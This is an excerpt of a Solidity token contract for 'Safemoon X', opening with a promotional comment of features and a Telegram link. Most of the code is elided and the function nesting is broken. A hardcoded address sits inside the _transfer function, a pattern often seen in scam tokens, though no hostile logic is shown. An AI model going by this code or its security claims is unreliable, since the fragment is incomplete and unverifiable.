/**
Safemoon X(safex) is developing technology that reduces the gaps between traditional and decentralized finance.
Our mission is to build a Blockchain ecosystem that is more secure, scalable, faster with lowest fee.

🟢Renounce and Lock 1 month
🟢Staking
🟢Web3 Wallet
🟢Swap/Dex
🟢 Good marketing plan 
...
TG: https://t.me/Safemoonxcommunity
*/
...
contract Safemoonx is Context, IERC20, Ownable {
    ...
    string private constant _name = "Safemoon X"; // 
    string private constant _symbol = "SafeX"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 4;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x9bdF2340F24B41b4316c899fd73aEb0054B7C45C;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0xbd6348933bC91D9407584217Af0c244eABAcb139;
